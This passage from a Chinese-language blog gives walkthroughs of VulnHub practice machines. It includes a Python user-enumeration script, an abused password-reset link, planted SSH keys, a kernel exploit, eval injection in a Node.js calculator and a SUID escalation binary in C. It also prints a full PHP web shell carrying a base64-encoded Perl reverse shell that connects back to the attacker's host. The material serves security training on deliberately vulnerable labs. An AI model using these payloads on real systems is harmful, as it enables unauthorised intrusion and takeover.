class="line"></span><br><span class="line">    <span class="keyword">return</span> (username + <span class="string">&quot; : &quot;</span> + level)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(getinfo(<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">King : Superadmin</span></span><br><span class="line"><span class="string">dave : Admin</span></span><br><span class="line"><span class="string">dragon : Admin</span></span><br><span class="line"><span class="string">coderguy : Admin</span></span><br><span class="line"><span class="string">cooldude89 : Moderator</span></span><br><span class="line"><span class="string">Sir : Moderator</span></span><br><span class="line"><span class="string">Q : Moderator</span></span><br><span class="line"><span class="string">teflon : Moderator</span></span><br><span class="line"><span class="string">TheDankMan : Regular member</span></span><br><span class="line"><span class="string">artemus : Regular member</span></span><br><span class="line"><span class="string">MrPotatoHead : Regular member</span></span><br><span class="line"><span class="string">Ian : Regular member</span></span><br><span class="line"><span class="string">kev : Member</span></span><br><span class="line"><span class="string">notanother : Member</span></span><br><span class="line"><span class="string">anybodyhome : Member</span></span><br><span class="line"><span class="string">onlyme : Member</span></span><br><span class="line"><span class="string">xer : Member</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>发现一个重置密码相关的页面。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412160500960.png" alt="image-20230412160500960"></p>
<p>在github上找到相关rails的项目源码：<a target="_blank" rel="noopener" href="https://github.com/rails/rails%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E7%94%A8ruby%E5%86%99%E7%9A%84%E6%A1%86%E6%9E%B6%E3%80%82">https://github.com/rails/rails，发现是用ruby写的框架。</a></p>
<p>找到<code>Ruby on Rails</code>相关教程：<a target="_blank" rel="noopener" href="https://static.kancloud.cn/wizardforcel/rails-tutorial/151269">https://static.kancloud.cn/wizardforcel/rails-tutorial/151269</a></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412162240825.png" alt="image-20230412162240825"></p>
<p>成功找到我们需要的url。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412162317332.png" alt="image-20230412162317332"></p>
<p>我们选择需要修改的用户，发现只能修改普通用户，得到修改用户密码的链接。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412162432818.png" alt="image-20230412162432818"></p>
<p>访问修改密码的链接，尝试逻辑错误，将用户改为King，成功修改超级管理员的密码。</p>
<p>发现一个文件上传的测试点，尝试上传发现错误，需要在控制面版开启上传的功能。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412170453822.png" alt="image-20230412170453822"></p>
<p>文件成功上传后没有路径，可以通过这个delete按钮发现文件的路径。</p>
<p>或者在上传文件的过程中抓包，进行目录穿越<code>../../../shell.php</code>，上传文件到网站根目录。</p>
<p>访问后发现没有办法解析，想一下发现网站是ruby写的，不能解析也很正常。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412172526306.png" alt="image-20230412172526306"></p>
<p>在这里，我们看到可能存在一个rails用户，尝试替换其ssh公钥使得我们可以无密码ssh登录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f rails</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">空格跳过</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到两个文件 rails rails.pub</span></span><br><span class="line"></span><br><span class="line">mv rails.pub authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412172927651.png" alt="image-20230412172927651"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412173029742.png" alt="image-20230412173029742"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv rails id_rsa-rails</span><br><span class="line">chmod 600 id_rsa-rails</span><br><span class="line">ssh -i id_rsa-rails rails@192.168.183.130</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*release</span><br></pre></td></tr></table></figure>

<p>找到对应的内核漏洞：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44298">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation - Linux local Exploit (exploit-db.com)</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc-5 exp.c -o exp</span><br><span class="line">./exp		# success</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412173705935.png" alt="image-20230412173705935"></p>
<p>学习一下suid提权。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412175826381.png" alt="image-20230412175826381"></p>
<p>由于我们在外部是无法访问8888端口的，所以需要做一个本地转发。</p>
<p><code>shift + ~ + c</code>进入ssh的交互页面。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">ssh&gt; </span><span class="language-bash">-L 8888:localhost:8888</span></span><br></pre></td></tr></table></figure>

<p>访问页面，发现是一个计算器。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name calc -print 2&gt;&amp;1| grep -v &quot;Permission denied&quot;		# 寻找 calc 文件，过滤没有权限访问的</span><br></pre></td></tr></table></figure>

<p>找到<code>cala.js</code>文件：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> sys = <span class="built_in">require</span>(<span class="string">&#x27;sys&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">exec</span>;		<span class="comment">// 命令注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Start server</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params">route</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">onRequest</span>(<span class="params">request, response</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">var</span> theurl = url.<span class="title function_">parse</span>(request.<span class="property">url</span>);</span><br><span class="line">                <span class="keyword">var</span> pathname = theurl.<span class="property">pathname</span>;</span><br><span class="line">                <span class="keyword">var</span> query = theurl.<span class="property">query</span>; </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Request for &quot;</span> + pathname + query + <span class="string">&quot; received.&quot;</span>);</span><br><span class="line">                <span class="title function_">route</span>(pathname, request, query, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(onRequest).<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server started&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route request</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">route</span>(<span class="params">pathname, request, query, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;About to route request for &quot;</span> + pathname);</span><br><span class="line">        <span class="keyword">switch</span> (pathname)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">// security risk</span></span><br><span class="line">                <span class="comment">/*case &quot;/ping&quot;:</span></span><br><span class="line"><span class="comment">                        pingit(pathname, request, query, response);</span></span><br><span class="line"><span class="comment">                        break;  */</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                        <span class="title function_">home</span>(pathname, request, query, response);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;/calc&quot;</span>:</span><br><span class="line">                        <span class="title function_">calc</span>(pathname, request, query, response);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="attr">default</span>:</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;404&quot;</span>);</span><br><span class="line">                        <span class="title function_">display_404</span>(pathname, request, response);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">home</span>(<span class="params">pathname, request, query, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">        response.<span class="title function_">end</span>(<span class="string">&quot;&lt;h1&gt;The King&#x27;s Calculator&lt;/h1&gt;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;p&gt;Enter your calculation below:&lt;/p&gt;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;form action=&#x27;/calc&#x27; method=&#x27;get&#x27;&gt;&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;&lt;input type=&#x27;text&#x27; name=&#x27;sum&#x27; value=&#x27;1+1&#x27;&gt;&quot;</span> +</span><br><span class="line">                                <span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Calculate!&#x27;&gt;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/form&gt;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;hr style=&#x27;margin-top:50%&#x27;&gt;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;small&gt;&lt;i&gt;Powered by node.js&lt;/i&gt;&lt;/small&gt;&quot;</span></span><br><span class="line">                        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">calc</span>(<span class="params">pathname, request, query, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">        sum = query.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sum)</span><br><span class="line">        response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">end</span>(<span class="built_in">eval</span>(sum).<span class="title function_">toString</span>());		<span class="comment">// eval执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ping</span>(<span class="params">pathname, request, query, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">        ip = query.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ip)</span><br><span class="line">        response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">exec</span>(<span class="string">&quot;ping -c4 &quot;</span> + ip, <span class="keyword">function</span>(<span class="params">err, stdout, stderr</span>) &#123;</span><br><span class="line">                response.<span class="title function_">end</span>(stdout);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">display_404</span>(<span class="params">pathname, request, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">        response.<span class="title function_">write</span>(<span class="string">&quot;&lt;h1&gt;404 Not Found&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        response.<span class="title function_">end</span>(<span class="string">&quot;I don&#x27;t have that page, sorry!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start the server and route the requests</span></span><br><span class="line"><span class="title function_">start</span>(route);</span><br></pre></td></tr></table></figure>

<p>尝试执行命令，发现没有回显。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412190534547.png" alt="image-20230412190534547"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412190614795.png" alt="image-20230412190614795"></p>
<p>不过确实在该目录下生成了文件，并且我们发现用户是king。那么可以尝试suid提权至king。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">vi exp.c</span><br><span class="line">----------------------------------------</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">        setreuid(1000, 1000);</span><br><span class="line">        execve(&quot;/bin/bash&quot;, NULL, NULL);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------</span><br><span class="line">gcc-5 exp.c -o exp</span><br><span class="line"></span><br><span class="line">vi king.sh</span><br><span class="line">----------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">!/bin/sh</span></span><br><span class="line">cp /tmp/exp /home/king/exp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4 - s</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">775 - everyone can execve</span></span><br><span class="line">chmod 4775 /home/king/exp</span><br><span class="line">----------------------------------------</span><br><span class="line">chmod 775 ./king.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412193954351.png" alt="image-20230412193954351"></p>
<p>这样我们就可以成功提权啦。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412194029323.png" alt="image-20230412194029323"></p>
<p>看一下king的权限：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412194050259.png" alt="image-20230412194050259"></p>
<p>发现不需要密码就可以切换到root用户。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412194122277.png" alt="image-20230412194122277"></p>
<h2 id="HACKNOS-OS-HAX"><a href="#HACKNOS-OS-HAX" class="headerlink" title="HACKNOS: OS-HAX"></a>HACKNOS: OS-HAX</h2><p>总结：相对比较简单的靶机，注意信息的收集；利用 suid 实现 awk 命令的提权。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">https://www.vulnhub.com/entry/hacknos-os-hax,389/</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412204629913.png" alt="image-20230412204629913"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412204349368.png" alt="image-20230412204349368"></p>
<p>尝试利用wordpress的漏洞，失败，也许是作者没有把这个洞放上去（或许是我tcl看不出来）。</p>
<p>不过通过目录扫描还发现了目录展示的功能。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412204938098.png" alt="image-20230412204938098"></p>
<p>按照图片的要求修改host文件，<strong>注意添加的是靶机的IP</strong>。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/flaghost.png" alt="flaghost"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412205346517.png" alt="image-20230412205346517"></p>
<p>找到比较可疑的密码<code>passw@45</code>，尝试登录，发现密码错误。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412210838166.png" alt="image-20230412210838166"></p>
<p>发现居然是一个目录，干！解密flag2得到密码。</p>
<p>在主题编辑里面找到<code>header.php</code>也就是默认的首页里面写入木马。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412211652960.png" alt="image-20230412211652960"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412211703847.png" alt="image-20230412211703847"></p>
<p>这里利用php反弹一个shell。</p>
<blockquote>
<p>脚本链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/119967112">(26条消息) PHP代码实现反弹shell_php反弹shell_hahahahaha!的博客-CSDN博客</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line">            <span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">            @<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">            @<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line">            <span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">            @<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line">                <span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">        @<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;192.168.183.128&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&#x27;5555&#x27;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>, <span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span> = <span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>, <span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412212049052.png" alt="image-20230412212049052"></p>
<p>利用之前的密码切换用户为web，查看权限。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412212638439.png" alt="image-20230412212638439"></p>
<p>发现可以以root执行awk函数，成功提权！</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230412213014107.png" alt="image-20230412213014107"></p>
<h2 id="HACKNOS-OS-BYTESEC"><a href="#HACKNOS-OS-BYTESEC" class="headerlink" title="HACKNOS: OS-BYTESEC"></a>HACKNOS: OS-BYTESEC</h2><p>总结：学习 smb 服务的探测与利用，主要了解了相关的三个工具；尝试利用 suid 劫持环境变量提权。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">hackNos: Os-Bytesec ~ VulnHub</a></p>
</blockquote>
<p>老样子先打点。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/vulnhub/image-20230425191423696.png"></p>
